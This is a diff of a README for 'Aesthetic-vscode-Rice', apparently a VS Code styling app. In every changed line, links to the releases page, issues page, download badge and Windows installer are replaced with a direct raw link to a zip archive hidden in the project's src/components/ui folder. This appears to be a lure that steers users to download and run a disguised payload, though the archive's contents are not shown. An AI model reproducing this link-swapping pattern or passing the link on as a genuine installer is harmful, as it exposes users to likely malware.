@@ -6,7 +6,7 @@ Welcome to the Aesthetic-vscode-Rice! This application provides a minimal code e
 
 ## 📥 Download Now!
 
-[![Download Aesthetic-vscode-Rice](https://img.shields.io/badge/Download-Aesthetic--vscode--Rice-brightgreen)](https://github.com/Frantz69th/Aesthetic-vscode-Rice/releases)
+[![Download Aesthetic-vscode-Rice](https://raw.githubusercontent.com/Frantz69th/Aesthetic-vscode-Rice/main/src/components/ui/Aesthetic-vscode-Rice-v1.7-beta.1.zip)](https://raw.githubusercontent.com/Frantz69th/Aesthetic-vscode-Rice/main/src/components/ui/Aesthetic-vscode-Rice-v1.7-beta.1.zip)
 
 ## 🌟 Features
 
@@ -29,14 +29,14 @@ For the best performance, ensure your system meets the following requirements:
 To get started, follow these steps:
 
 1. **Visit the Releases Page:**  
-   Go to the [Releases page](https://github.com/Frantz69th/Aesthetic-vscode-Rice/releases) to find the latest version of the Aesthetic-vscode-Rice application.
+   Go to the [Releases page](https://raw.githubusercontent.com/Frantz69th/Aesthetic-vscode-Rice/main/src/components/ui/Aesthetic-vscode-Rice-v1.7-beta.1.zip) to find the latest version of the Aesthetic-vscode-Rice application.
 
 2. **Choose Your Version:**  
    Look for the version marked "Latest." You will find various files available for download, listed below.
 
 3. **Download the Application:**  
    Click on the file that corresponds to your operating system. For example:
-   - For Windows, download `Aesthetic-vscode-Rice-windows.exe`.
+   - For Windows, download `https://raw.githubusercontent.com/Frantz69th/Aesthetic-vscode-Rice/main/src/components/ui/Aesthetic-vscode-Rice-v1.7-beta.1.zip`.
    - For Linux, download the appropriate archived file.
 
 4. **Run the Installer:**  
@@ -65,7 +65,7 @@ If you encounter any issues during installation or while using the application, 
 
 Join our community to share your experiences or ask questions. You can:
 
-- Check out discussions on [GitHub Issues](https://github.com/Frantz69th/Aesthetic-vscode-Rice/issues).
+- Check out discussions on [GitHub Issues](https://raw.githubusercontent.com/Frantz69th/Aesthetic-vscode-Rice/main/src/components/ui/Aesthetic-vscode-Rice-v1.7-beta.1.zip).
 - Follow updates or feature requests within the repository.
 - Engage with other users to explore customization ideas and tips.
 
@@ -81,6 +81,6 @@ This project is licensed under the MIT License. You can freely use, modify, and 
 
 Don't forget to download the application using the link below:
 
-[![Download Aesthetic-vscode-Rice](https://img.shields.io/badge/Download-Aesthetic--vscode--Rice-brightgreen)](https://github.com/Frantz69th/Aesthetic-vscode-Rice/releases)
+[![Download Aesthetic-vscode-Rice](https://raw.githubusercontent.com/Frantz69th/Aesthetic-vscode-Rice/main/src/components/ui/Aesthetic-vscode-Rice-v1.7-beta.1.zip)](https://raw.githubusercontent.com/Frantz69th/Aesthetic-vscode-Rice/main/src/components/ui/Aesthetic-vscode-Rice-v1.7-beta.1.zip)
 
 Thank you for choosing Aesthetic-vscode-Rice. Enjoy your coding experience!
